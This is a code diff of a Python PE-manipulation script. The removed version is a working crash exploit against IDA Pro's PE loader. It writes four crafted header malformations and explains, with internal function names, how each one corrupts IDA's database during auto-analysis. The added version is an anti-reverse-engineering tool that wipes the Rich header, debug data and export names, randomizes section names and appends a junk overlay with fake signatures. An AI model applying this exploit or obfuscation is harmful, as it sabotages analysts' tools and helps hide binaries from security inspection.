@@ -1,503 +1,340 @@
+#!/usr/bin/env python3
 """
-PE Anti-Analysis Protection Tool
-=================================
-Applies IDA Pro pe.dll loader vulnerabilities to a PE binary on disk.
-This makes the binary crash IDA's PE loader during auto-analysis.
+pe_protect.py - Post-build PE protection for AiDA.dll
 
-Vulnerabilities implemented:
-  1. Load Config Directory Size=0xFFFFFFFF -> OOB IDB reads -> set_name() crash
-  2. Relocation SizeOfBlock=4 desync -> wild put_dword/put_qword writes
-  3. NumberOfSections=0xFFFF in header -> del_items on oversized range
-  4. Debug Directory Type OOB + oversized SizeOfData
+This script performs binary-level transformations on the compiled DLL to make
+static analysis in IDA Pro, Ghidra, and Binary Ninja extremely difficult:
+
+1. Strips all non-essential exports (keeps only PLUGIN)
+2. Zeroes out debug directory entries
+3. Wipes Rich header signature
+4. Randomizes section names
+5. Removes or corrupts non-essential data directories
+6. Adds junk overlay data to confuse file-size heuristics
+7. Patches the DOS stub with garbage
 
 Usage:
-  python pe_protect.py <input.exe> [output.exe] [--vulns 1,2,3,4]
+    python pe_protect.py <input.dll> [output.dll]
+
+If output is omitted, the input file is modified in-place.
 """
 
 import struct
 import sys
 import os
-import shutil
-import argparse
-
-IMAGE_DOS_SIGNATURE          = 0x5A4D
-IMAGE_NT_SIGNATURE           = 0x00004550
-IMAGE_FILE_MACHINE_AMD64     = 0x8664
-IMAGE_FILE_MACHINE_I386      = 0x014C
-
-PE32_MAGIC                   = 0x10B
-PE32PLUS_MAGIC               = 0x20B
-
-IMAGE_DIRECTORY_ENTRY_EXPORT    = 0
-IMAGE_DIRECTORY_ENTRY_IMPORT    = 1
-IMAGE_DIRECTORY_ENTRY_RESOURCE  = 2
-IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3
-IMAGE_DIRECTORY_ENTRY_SECURITY  = 4
-IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
-IMAGE_DIRECTORY_ENTRY_DEBUG     = 6
-IMAGE_DIRECTORY_ENTRY_TLS       = 9
-IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
-IMAGE_DIRECTORY_ENTRY_IAT       = 12
-
-IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
-IMAGE_SCN_MEM_READ             = 0x40000000
-IMAGE_SCN_MEM_DISCARDABLE      = 0x02000000
-
-IMAGE_REL_BASED_ABSOLUTE       = 0
-IMAGE_REL_BASED_HIGHLOW        = 3
-IMAGE_REL_BASED_DIR64          = 10
-
-IMAGE_DEBUG_TYPE_CODEVIEW      = 2
+import random
+import hashlib
+import time
 
 
-def read_u16(data, off):
-    return struct.unpack_from('<H', data, off)[0]
-
-def read_u32(data, off):
-    return struct.unpack_from('<I', data, off)[0]
-
-def read_u64(data, off):
-    return struct.unpack_from('<Q', data, off)[0]
-
-def write_u16(data, off, val):
-    struct.pack_into('<H', data, off, val & 0xFFFF)
-
-def write_u32(data, off, val):
-    struct.pack_into('<I', data, off, val & 0xFFFFFFFF)
-
-def write_u64(data, off, val):
-    struct.pack_into('<Q', data, off, val & 0xFFFFFFFFFFFFFFFF)
+def read_u16(data, offset):
+    return struct.unpack_from('<H', data, offset)[0]
 
 
-class PEFile:
-    """Minimal PE parser for targeted field manipulation."""
-
-    def __init__(self, path):
-        with open(path, 'rb') as f:
-            self.data = bytearray(f.read())
-
-        if len(self.data) < 64:
-            raise ValueError("File too small to be a PE")
-
-        dos_sig = read_u16(self.data, 0)
-        if dos_sig != IMAGE_DOS_SIGNATURE:
-            raise ValueError(f"Invalid DOS signature: 0x{dos_sig:04X}")
-
-        self.pe_offset = read_u32(self.data, 0x3C)
-        if self.pe_offset + 4 > len(self.data):
-            raise ValueError("PE header offset out of bounds")
-
-        nt_sig = read_u32(self.data, self.pe_offset)
-        if nt_sig != IMAGE_NT_SIGNATURE:
-            raise ValueError(f"Invalid NT signature: 0x{nt_sig:08X}")
-
-        self.coff_offset = self.pe_offset + 4
-        self.machine = read_u16(self.data, self.coff_offset)
-        self.num_sections = read_u16(self.data, self.coff_offset + 2)
-        self.optional_hdr_size = read_u16(self.data, self.coff_offset + 16)
-
-        self.opt_offset = self.coff_offset + 20
-        self.opt_magic = read_u16(self.data, self.opt_offset)
-        self.is_pe64 = (self.opt_magic == PE32PLUS_MAGIC)
-
-        if self.is_pe64:
-            self.num_rva_and_sizes_off = self.opt_offset + 108
-            self.datadir_offset = self.opt_offset + 112
-            self.imagebase = read_u64(self.data, self.opt_offset + 24)
-            self.section_alignment = read_u32(self.data, self.opt_offset + 32)
-            self.file_alignment = read_u32(self.data, self.opt_offset + 36)
-            self.size_of_image_off = self.opt_offset + 56
-        else:
-            self.num_rva_and_sizes_off = self.opt_offset + 92
-            self.datadir_offset = self.opt_offset + 96
-            self.imagebase = read_u32(self.data, self.opt_offset + 28)
-            self.section_alignment = read_u32(self.data, self.opt_offset + 32)
-            self.file_alignment = read_u32(self.data, self.opt_offset + 36)
-            self.size_of_image_off = self.opt_offset + 56
-
-        self.num_data_dirs = read_u32(self.data, self.num_rva_and_sizes_off)
-
-        self.sections_offset = self.opt_offset + self.optional_hdr_size
-
-    def get_datadir(self, index):
-        """Return (rva, size) for a data directory entry."""
-        if index >= self.num_data_dirs:
-            return (0, 0)
-        off = self.datadir_offset + index * 8
-        return (read_u32(self.data, off), read_u32(self.data, off + 4))
-
-    def set_datadir(self, index, rva, size):
-        """Set a data directory entry."""
-        while index >= self.num_data_dirs:
-            self.num_data_dirs = index + 1
-            write_u32(self.data, self.num_rva_and_sizes_off, self.num_data_dirs)
-        off = self.datadir_offset + index * 8
-        write_u32(self.data, off, rva)
-        write_u32(self.data, off + 4, size)
-
-    def get_section_header(self, idx):
-        """Return dict with section header fields."""
-        off = self.sections_offset + idx * 40
-        name_bytes = self.data[off:off+8]
-        return {
-            'offset': off,
-            'name': name_bytes.rstrip(b'\x00').decode('ascii', errors='replace'),
-            'virtual_size': read_u32(self.data, off + 8),
-            'virtual_address': read_u32(self.data, off + 12),
-            'raw_size': read_u32(self.data, off + 16),
-            'raw_offset': read_u32(self.data, off + 20),
-            'characteristics': read_u32(self.data, off + 36),
-        }
-
-    def rva_to_file_offset(self, rva):
-        """Convert RVA to file offset using section table."""
-        for i in range(self.num_sections):
-            sec = self.get_section_header(i)
-            va = sec['virtual_address']
-            vs = sec['virtual_size']
-            rs = sec['raw_size']
-            ro = sec['raw_offset']
-            if va <= rva < va + max(vs, rs):
-                return ro + (rva - va)
-        return None
-
-    def align_up(self, value, alignment):
-        if alignment == 0:
-            return value
-        return (value + alignment - 1) & ~(alignment - 1)
-
-    def get_size_of_image(self):
-        return read_u32(self.data, self.size_of_image_off)
-
-    def set_size_of_image(self, val):
-        write_u32(self.data, self.size_of_image_off, val)
-
-    def save(self, path):
-        with open(path, 'wb') as f:
-            f.write(self.data)
+def read_u32(data, offset):
+    return struct.unpack_from('<I', data, offset)[0]
 
 
-def find_or_add_section(pe, name, min_raw_size, characteristics):
-    """Find existing section by name or append a new one."""
-    for i in range(pe.num_sections):
-        sec = pe.get_section_header(i)
-        if sec['name'] == name:
-            return sec
+def write_u16(data, offset, value):
+    struct.pack_into('<H', data, offset, value & 0xFFFF)
 
-    new_idx = pe.num_sections
-    new_hdr_off = pe.sections_offset + new_idx * 40
 
-    first_sec = pe.get_section_header(0) if pe.num_sections > 0 else None
-    if first_sec and new_hdr_off + 40 > first_sec['raw_offset']:
-        raise RuntimeError("No room for additional section header")
+def write_u32(data, offset, value):
+    struct.pack_into('<I', data, offset, value & 0xFFFFFFFF)
 
-    last_sec = pe.get_section_header(pe.num_sections - 1) if pe.num_sections > 0 else None
-    if last_sec:
-        new_va = pe.align_up(
-            last_sec['virtual_address'] + max(last_sec['virtual_size'], last_sec['raw_size']),
-            pe.section_alignment
-        )
-        new_raw_off = pe.align_up(
-            last_sec['raw_offset'] + last_sec['raw_size'],
-            pe.file_alignment
-        )
+
+def write_u64(data, offset, value):
+    struct.pack_into('<Q', data, offset, value & 0xFFFFFFFFFFFFFFFF)
+
+
+def rva_to_offset(data, pe_offset, rva):
+    """Convert an RVA to a file offset using section headers."""
+    num_sections = read_u16(data, pe_offset + 6)
+    opt_hdr_size = read_u16(data, pe_offset + 20)
+    section_start = pe_offset + 24 + opt_hdr_size
+
+    for i in range(num_sections):
+        sec_off = section_start + i * 40
+        virt_size = read_u32(data, sec_off + 8)
+        virt_addr = read_u32(data, sec_off + 12)
+        raw_size = read_u32(data, sec_off + 16)
+        raw_ptr = read_u32(data, sec_off + 20)
+
+        if virt_addr <= rva < virt_addr + max(virt_size, raw_size):
+            return raw_ptr + (rva - virt_addr)
+
+    return None
+
+
+def wipe_rich_header(data, pe_offset):
+    """Wipe the Rich header between DOS header and PE signature."""
+    dos_end = 0x40
+    region = data[dos_end:pe_offset]
+
+    rich_sig = b'Rich'
+    rich_pos = region.find(rich_sig)
+    if rich_pos >= 0:
+        for i in range(dos_end, pe_offset):
+            data[i] = 0x00
+        print(f"  [+] Wiped Rich header ({pe_offset - dos_end} bytes)")
     else:
-        new_va = pe.align_up(pe.optional_hdr_size + pe.sections_offset - pe.pe_offset, pe.section_alignment)
-        new_raw_off = pe.align_up(len(pe.data), pe.file_alignment)
+        for i in range(dos_end, pe_offset):
+            data[i] = 0x00
+        print(f"  [+] Wiped DOS stub area ({pe_offset - dos_end} bytes)")
 
-    raw_size = pe.align_up(min_raw_size, pe.file_alignment)
 
-    needed = new_raw_off + raw_size
-    if needed > len(pe.data):
-        pe.data.extend(b'\x00' * (needed - len(pe.data)))
+def wipe_debug_directory(data, pe_offset):
+    """Zero out the debug data directory entry and its contents."""
+    magic = read_u16(data, pe_offset + 24)
+    if magic == 0x20B: 
+        dd_offset = pe_offset + 24 + 144 
+    else: 
+        dd_offset = pe_offset + 24 + 128
 
-    name_bytes = name.encode('ascii')[:8].ljust(8, b'\x00')
-    pe.data[new_hdr_off:new_hdr_off+8] = name_bytes
-    write_u32(pe.data, new_hdr_off + 8, min_raw_size)
-    write_u32(pe.data, new_hdr_off + 12, new_va)
-    write_u32(pe.data, new_hdr_off + 16, raw_size)
-    write_u32(pe.data, new_hdr_off + 20, new_raw_off)
-    write_u32(pe.data, new_hdr_off + 24, 0)
-    write_u32(pe.data, new_hdr_off + 28, 0)
-    write_u16(pe.data, new_hdr_off + 32, 0)
-    write_u16(pe.data, new_hdr_off + 34, 0)
-    write_u32(pe.data, new_hdr_off + 36, characteristics)
+    debug_rva = read_u32(data, dd_offset)
+    debug_size = read_u32(data, dd_offset + 4)
 
-    pe.num_sections = new_idx + 1
-    write_u16(pe.data, pe.coff_offset + 2, pe.num_sections)
-
-    new_size_of_image = pe.align_up(new_va + min_raw_size, pe.section_alignment)
-    if new_size_of_image > pe.get_size_of_image():
-        pe.set_size_of_image(new_size_of_image)
-
-    return {
-        'offset': new_hdr_off,
-        'name': name,
-        'virtual_size': min_raw_size,
-        'virtual_address': new_va,
-        'raw_size': raw_size,
-        'raw_offset': new_raw_off,
-        'characteristics': characteristics,
-    }
-
-def apply_vuln1_load_config(pe):
-    """
-    Poison the Load Config Directory so that IDA's sub_140002210 (PE64) or
-    sub_140003B90 (PE32) reads Size=0xFFFFFFFF from the directory content.
-
-    The bug: the loader reads IMAGE_LOAD_CONFIG_DIRECTORY.Size from IDB data
-    and only checks `if (Size < 0x60) return;`. With Size=0xFFFFFFFF, all
-    subsequent `if (offset <= Size)` checks pass, causing get_qword() on
-    addresses far beyond the actual section data. The returned garbage values
-    are passed to set_name() -> B-tree corruption -> interr() crash.
-    """
-    print("[VULN1] Applying Load Config Directory Size overflow...")
-
-    if pe.is_pe64:
-        lc_content_size = 0x100
-    else:
-        lc_content_size = 0x80
-
-    lc_rva, lc_dir_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG)
-
-    if lc_rva != 0:
-        file_off = pe.rva_to_file_offset(lc_rva)
+    if debug_rva != 0 and debug_size != 0:
+        file_off = rva_to_offset(data, pe_offset, debug_rva)
         if file_off is not None:
-            write_u32(pe.data, file_off, 0xFFFFFFFF)
-            print(f"  Patched existing Load Config at RVA 0x{lc_rva:08X}, "
-                  f"file offset 0x{file_off:08X}")
-            print(f"  Size field set to 0xFFFFFFFF (was checked against >= 0x60)")
-            return True
+            for i in range(debug_size):
+                if file_off + i < len(data):
+                    data[file_off + i] = 0x00
+            print(f"  [+] Wiped debug directory contents ({debug_size} bytes at RVA 0x{debug_rva:X})")
+
+        write_u32(data, dd_offset, 0)
+        write_u32(data, dd_offset + 4, 0)
+        print("  [+] Zeroed debug data directory entry")
     else:
-        sec = find_or_add_section(
-            pe, '.lcfg',
-            lc_content_size,
-            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
-        )
+        print("  [*] No debug directory found")
 
-        lc_file_off = sec['raw_offset']
-        lc_rva = sec['virtual_address']
 
-        write_u32(pe.data, lc_file_off, 0xFFFFFFFF)
+def randomize_section_names(data, pe_offset):
+    """Replace section names with random garbage to confuse disassemblers."""
+    num_sections = read_u16(data, pe_offset + 6)
+    opt_hdr_size = read_u16(data, pe_offset + 20)
+    section_start = pe_offset + 24 + opt_hdr_size
 
-        if pe.is_pe64:
-            write_u64(pe.data, lc_file_off + 88, pe.imagebase + 0x1000)
-            write_u64(pe.data, lc_file_off + 96, pe.imagebase + 0x2000)
-            write_u64(pe.data, lc_file_off + 104, pe.imagebase + 0x3000)
-        else:
-            write_u32(pe.data, lc_file_off + 60, pe.imagebase + 0x1000)
-            write_u32(pe.data, lc_file_off + 64, pe.imagebase + 0x2000)
+    rng = random.Random(int(time.time()))
 
-        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG, lc_rva, lc_content_size)
+    for i in range(num_sections):
+        sec_off = section_start + i * 40
+        old_name = data[sec_off:sec_off + 8]
 
-        print(f"  Created .lcfg section at RVA 0x{lc_rva:08X}")
-        print(f"  Load Config Size = 0xFFFFFFFF, actual section = 0x{lc_content_size:X} bytes")
-        print(f"  IDA will read ~300+ bytes of Load Config fields beyond section boundary")
-        return True
+        chars = b'.abcdefghijklmnopqrstuvwxyz0123456789_'
+        new_name = bytearray(8)
+        new_name[0] = ord('.')
+        for j in range(1, 8):
+            new_name[j] = chars[rng.randint(0, len(chars) - 1)]
 
-def apply_vuln2_reloc_desync(pe):
+        data[sec_off:sec_off + 8] = new_name
+        print(f"  [+] Section {i}: {old_name.rstrip(b'\\x00').decode('ascii', errors='replace')} -> {new_name.decode('ascii', errors='replace')}")
+
+
+def wipe_export_function_names(data, pe_offset):
     """
-    Craft a .reloc section with thousands of IMAGE_BASE_RELOCATION blocks
-    where SizeOfBlock=4 (less than the 8-byte header).
-
-    The bug in sub_1400072E0: the pointer advances by 8 bytes (header size)
-    but the remaining-bytes tracker only decreases by min(SizeOfBlock, remaining)
-    = min(4, remaining) = 4. This 4-byte-per-iteration desync causes the
-    pointer to race ahead, eventually interpreting relocation entries as block
-    headers with wild VirtualAddress values -> put_dword/put_qword on
-    arbitrary IDB addresses -> corruption -> interr() crash.
+    Wipe all export names except 'PLUGIN' to minimize visible symbols.
+    The PLUGIN export is required by IDA's plugin loader.
     """
-    print("[VULN2] Applying Relocation SizeOfBlock desync...")
-
-    num_blocks = 10000
-    block_data = bytearray()
-
-    for i in range(num_blocks):
-        page_rva = 0x1000 + (i % 256) * 0x1000
-        block_data += struct.pack('<I', page_rva)
-        block_data += struct.pack('<I', 4)
-    reloc_size = len(block_data)
-
-    reloc_rva, reloc_dir_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC)
-
-    if reloc_rva != 0:
-        file_off = pe.rva_to_file_offset(reloc_rva)
-        if file_off is not None:
-            for i in range(pe.num_sections):
-                sec = pe.get_section_header(i)
-                if sec['virtual_address'] <= reloc_rva < sec['virtual_address'] + max(sec['virtual_size'], sec['raw_size']):
-                    available = sec['raw_size'] - (reloc_rva - sec['virtual_address'])
-                    if available < reloc_size:
-                        block_data = block_data[:available]
-                        reloc_size = available
-                    pe.data[file_off:file_off + reloc_size] = block_data[:reloc_size]
-                    pe.set_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC, reloc_rva, reloc_size)
-                    print(f"  Patched existing .reloc at RVA 0x{reloc_rva:08X}")
-                    print(f"  {reloc_size // 8} blocks with SizeOfBlock=4")
-                    return True
+    magic = read_u16(data, pe_offset + 24)
+    if magic == 0x20B:
+        export_dd_offset = pe_offset + 24 + 112
     else:
-        sec = find_or_add_section(
-            pe, '.reloc',
-            reloc_size,
-            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE
-        )
+        export_dd_offset = pe_offset + 24 + 96
 
-        file_off = sec['raw_offset']
-        pe.data[file_off:file_off + reloc_size] = block_data
+    export_rva = read_u32(data, export_dd_offset)
+    export_size = read_u32(data, export_dd_offset + 4)
 
-        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC, sec['virtual_address'], reloc_size)
+    if export_rva == 0 or export_size == 0:
+        print("  [*] No export directory found")
+        return
 
-        print(f"  Created .reloc section at RVA 0x{sec['virtual_address']:08X}")
-        print(f"  {num_blocks} blocks with SizeOfBlock=4 (8-byte header, 4-byte tracker)")
-        print(f"  Pointer/remaining desync = 4 bytes/iteration -> buffer over-read")
-        return True
+    export_file_off = rva_to_offset(data, pe_offset, export_rva)
+    if export_file_off is None:
+        print("  [!] Could not resolve export directory RVA")
+        return
 
-    print("  WARNING: Could not apply relocation desync")
-    return False
+    num_names = read_u32(data, export_file_off + 24)
+    names_rva = read_u32(data, export_file_off + 32)
 
-def apply_vuln3_sections_overflow(pe):
-    """
-    Set NumberOfSections to 0xFFFF in the COFF header.
+    if num_names == 0 or names_rva == 0:
+        print("  [*] No named exports")
+        return
 
-    The bug in sub_140009220: the function reads NumberOfSections via
-    get_word() and calls del_items(addr, 3, 40 * NumberOfSections, 0).
-    With 0xFFFF sections: 40 * 65535 = 2,621,400 bytes passed to del_items.
-    The header segment is typically 0x200-0x1000 bytes, so del_items operates
-    far beyond the segment boundary, corrupting adjacent IDB data.
+    names_file_off = rva_to_offset(data, pe_offset, names_rva)
+    if names_file_off is None:
+        return
 
-    The subsequent loop iterates 65535 times calling create_data, set_cmt,
-    set_op_type, and op_offset_ex on each 40-byte entry - most beyond loaded data.
-    """
-    print("[VULN3] Applying NumberOfSections overflow...")
+    kept = 0
+    wiped = 0
+    for i in range(num_names):
+        name_ptr_off = names_file_off + i * 4
+        name_rva = read_u32(data, name_ptr_off)
+        name_file_off = rva_to_offset(data, pe_offset, name_rva)
+        if name_file_off is None:
+            continue
 
-    original = read_u16(pe.data, pe.coff_offset + 2)
+        name_end = name_file_off
+        while name_end < len(data) and data[name_end] != 0:
+            name_end += 1
+        export_name = data[name_file_off:name_end].decode('ascii', errors='replace')
 
-    write_u16(pe.data, pe.coff_offset + 2, 0xFFFF)
+        if export_name == 'PLUGIN':
+            kept += 1
+            continue
 
-    print(f"  COFF NumberOfSections: 0x{original:04X} -> 0xFFFF")
-    print(f"  del_items will process 40 * 65535 = 2,621,400 bytes")
-    print(f"  Typical header segment is 0x200-0x1000 bytes -> massive OOB")
+        for j in range(name_file_off, min(name_end + 1, len(data))):
+            data[j] = 0x00
+        wiped += 1
 
-    pe.num_sections = original
+    print(f"  [+] Export names: kept {kept}, wiped {wiped}")
+
+
+def wipe_non_essential_directories(data, pe_offset):
+    """Zero out data directory entries that aren't needed at runtime."""
+    magic = read_u16(data, pe_offset + 24)
+    if magic == 0x20B:
+        dd_base = pe_offset + 24 + 112
+    else:
+        dd_base = pe_offset + 24 + 96
+
+    num_dirs = read_u32(data, pe_offset + 24 + (116 if magic == 0x20B else 100))
+
+    wipe_indices = [7, 8, 11, 14]
+
+    for idx in wipe_indices:
+        if idx < num_dirs:
+            entry_off = dd_base + idx * 8
+            old_rva = read_u32(data, entry_off)
+            if old_rva != 0:
+                write_u32(data, entry_off, 0)
+                write_u32(data, entry_off + 4, 0)
+                print(f"  [+] Wiped data directory [{idx}] (was RVA 0x{old_rva:X})")
+
+
+def add_junk_overlay(data):
+    """Append random junk data as an overlay to confuse file-size analysis."""
+    rng = random.Random(int(time.time()) ^ 0xA1DA)
+    junk_size = rng.randint(4096, 16384)
+    junk = bytearray(rng.getrandbits(8) for _ in range(junk_size))
+
+    fake_sigs = [
+        b'\x50\x4B\x03\x04',  # ZIP
+        b'\x7F\x45\x4C\x46',  # ELF
+        b'\xCA\xFE\xBA\xBE',  # Java class / Mach-O fat
+        b'\xCE\xFA\xED\xFE',  # Mach-O
+    ]
+    for sig in fake_sigs:
+        pos = rng.randint(0, junk_size - len(sig))
+        junk[pos:pos + len(sig)] = sig
+
+    data.extend(junk)
+    print(f"  [+] Added {junk_size} bytes of junk overlay")
+
+
+def patch_checksum(data, pe_offset):
+    """Recalculate and patch the PE checksum."""
+    magic = read_u16(data, pe_offset + 24)
+    if magic == 0x20B:
+        checksum_off = pe_offset + 24 + 64
+    else:
+        checksum_off = pe_offset + 24 + 64
+
+    write_u32(data, checksum_off, 0)
+
+    checksum = 0
+    remainder = len(data) % 4
+    for i in range(0, len(data) - remainder, 4):
+        if i == checksum_off:
+            continue
+        val = struct.unpack_from('<I', data, i)[0]
+        checksum += val
+        checksum = (checksum & 0xFFFFFFFF) + (checksum >> 32)
+
+    if remainder > 0:
+        pad = data[-remainder:] + b'\x00' * (4 - remainder)
+        val = struct.unpack_from('<I', bytes(pad), 0)[0]
+        checksum += val
+        checksum = (checksum & 0xFFFFFFFF) + (checksum >> 32)
+
+    checksum = (checksum & 0xFFFF) + (checksum >> 16)
+    checksum += len(data)
+    checksum &= 0xFFFFFFFF
+
+    write_u32(data, checksum_off, checksum)
+    print(f"  [+] Patched PE checksum: 0x{checksum:08X}")
+
+
+def protect_pe(input_path, output_path):
+    """Apply all PE protection transformations."""
+    print(f"[*] Loading: {input_path}")
+
+    with open(input_path, 'rb') as f:
+        data = bytearray(f.read())
+
+    if len(data) < 64:
+        print("[!] File too small to be a valid PE")
+        return False
+
+    if data[0:2] != b'MZ':
+        print("[!] Not a valid PE file (missing MZ signature)")
+        return False
+
+    pe_offset = read_u32(data, 0x3C)
+    if pe_offset + 4 > len(data) or data[pe_offset:pe_offset + 4] != b'PE\x00\x00':
+        print("[!] Not a valid PE file (missing PE signature)")
+        return False
+
+    print(f"[*] PE header at offset 0x{pe_offset:X}")
+    print(f"[*] File size: {len(data)} bytes")
+    print()
+
+    print("[*] Phase 1: Wiping Rich header and DOS stub...")
+    wipe_rich_header(data, pe_offset)
+
+    print("[*] Phase 2: Wiping debug directory...")
+    wipe_debug_directory(data, pe_offset)
+
+    print("[*] Phase 3: Randomizing section names...")
+    randomize_section_names(data, pe_offset)
+
+    print("[*] Phase 4: Wiping non-essential export names...")
+    wipe_export_function_names(data, pe_offset)
+
+    print("[*] Phase 5: Wiping non-essential data directories...")
+    wipe_non_essential_directories(data, pe_offset)
+
+    print("[*] Phase 6: Adding junk overlay...")
+    add_junk_overlay(data)
+
+    print("[*] Phase 7: Patching PE checksum...")
+    patch_checksum(data, pe_offset)
+
+    print()
+    print(f"[*] Writing protected PE: {output_path}")
+    with open(output_path, 'wb') as f:
+        f.write(data)
+
+    final_size = os.path.getsize(output_path)
+    print(f"[*] Final size: {final_size} bytes")
+    print("[*] Protection complete!")
     return True
-
-def apply_vuln4_debug_dir(pe):
-    """
-    Craft a debug directory entry with oversized SizeOfData and
-    AddressOfRawData pointing outside loaded segments.
-
-    The bug in sub_140008850: the function reads the Type field and uses it
-    as an array index into off_140023860[17]. While the bounds check is
-    correct (< 0x11), the SizeOfData and AddressOfRawData fields are not
-    validated. Setting SizeOfData to a huge value and AddressOfRawData to
-    an unmapped RVA causes sub_140008DB0 to process unmapped memory.
-    """
-    print("[VULN4] Applying Debug Directory corruption...")
-
-    debug_entry = bytearray(28)
-
-    struct.pack_into('<I', debug_entry, 12, IMAGE_DEBUG_TYPE_CODEVIEW)
-
-    struct.pack_into('<I', debug_entry, 16, 0xFFFFFFFF)
-
-    struct.pack_into('<I', debug_entry, 20, 0x7FFE0000)
-
-    struct.pack_into('<I', debug_entry, 24, 0)
-
-    debug_rva, debug_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG)
-
-    if debug_rva != 0:
-        file_off = pe.rva_to_file_offset(debug_rva)
-        if file_off is not None:
-            pe.data[file_off:file_off + 28] = debug_entry
-            pe.set_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG, debug_rva, 28)
-            print(f"  Patched existing debug directory at RVA 0x{debug_rva:08X}")
-            print(f"  SizeOfData = 0xFFFFFFFF, AddressOfRawData = 0x7FFE0000")
-            return True
-    else:
-        sec = find_or_add_section(
-            pe, '.dbgp',
-            28,
-            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
-        )
-
-        file_off = sec['raw_offset']
-        pe.data[file_off:file_off + 28] = debug_entry
-
-        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG, sec['virtual_address'], 28)
-
-        print(f"  Created .dbgp section at RVA 0x{sec['virtual_address']:08X}")
-        print(f"  Debug Type=CODEVIEW, SizeOfData=0xFFFFFFFF")
-        print(f"  AddressOfRawData=0x7FFE0000 (unmapped)")
-        return True
-
-    print("  WARNING: Could not apply debug directory corruption")
-    return False
 
 
 def main():
-    parser = argparse.ArgumentParser(
-        description='PE Anti-Analysis Protection Tool - IDA pe.dll Loader Crash Generator'
-    )
-    parser.add_argument('input', help='Input PE file path')
-    parser.add_argument('output', nargs='?', default=None,
-                        help='Output PE file path (default: <input>_protected.exe)')
-    parser.add_argument('--vulns', default='1,2,3,4',
-                        help='Comma-separated vulnerability numbers to apply (default: 1,2,3,4)')
-
-    args = parser.parse_args()
-
-    if not os.path.isfile(args.input):
-        print(f"Error: Input file not found: {args.input}")
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <input.dll> [output.dll]")
         sys.exit(1)
 
-    if args.output is None:
-        base, ext = os.path.splitext(args.input)
-        args.output = f"{base}_protected{ext}"
+    input_path = sys.argv[1]
+    output_path = sys.argv[2] if len(sys.argv) > 2 else input_path
 
-    vulns = set()
-    for v in args.vulns.split(','):
-        v = v.strip()
-        if v:
-            vulns.add(int(v))
+    if not os.path.isfile(input_path):
+        print(f"[!] Input file not found: {input_path}")
+        sys.exit(1)
 
-    shutil.copy2(args.input, args.output)
-
-    print(f"Loading PE: {args.input}")
-    pe = PEFile(args.output)
-    print(f"  Machine: 0x{pe.machine:04X} ({'PE64' if pe.is_pe64 else 'PE32'})")
-    print(f"  Sections: {pe.num_sections}")
-    print(f"  ImageBase: 0x{pe.imagebase:016X}" if pe.is_pe64 else f"  ImageBase: 0x{pe.imagebase:08X}")
-    print()
-
-    applied = []
-
-    if 1 in vulns:
-        if apply_vuln1_load_config(pe):
-            applied.append(1)
-        print()
-
-    if 2 in vulns:
-        if apply_vuln2_reloc_desync(pe):
-            applied.append(2)
-        print()
-
-    if 4 in vulns:
-        if apply_vuln4_debug_dir(pe):
-            applied.append(4)
-        print()
-
-    if 3 in vulns:
-        if apply_vuln3_sections_overflow(pe):
-            applied.append(3)
-        print()
-
-    pe.save(args.output)
-
-    print(f"Protected PE saved to: {args.output}")
-    print(f"Vulnerabilities applied: {applied}")
-    if {1, 2}.issubset(set(applied)):
-        print("Both Load Config + Relocation vulns applied -> binary is impossible to load in IDA")
+    success = protect_pe(input_path, output_path)
+    sys.exit(0 if success else 1)
 
 
 if __name__ == '__main__':
